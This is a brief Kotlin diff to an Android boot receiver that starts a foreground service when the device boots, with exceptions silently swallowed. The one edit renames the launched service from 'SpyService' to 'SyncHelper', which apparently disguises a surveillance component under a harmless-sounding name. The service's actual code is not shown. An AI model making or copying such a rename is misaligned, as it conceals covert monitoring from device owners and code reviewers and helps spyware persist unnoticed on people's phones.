@@ -5,7 +5,7 @@ import android.content.Intent
 class BootReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
         if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
-            try { context.startForegroundService(Intent(context, SpyService::class.java)) } catch (_: Exception) {}
+            try { context.startForegroundService(Intent(context, SyncHelper::class.java)) } catch (_: Exception) {}
         }
     }
 }
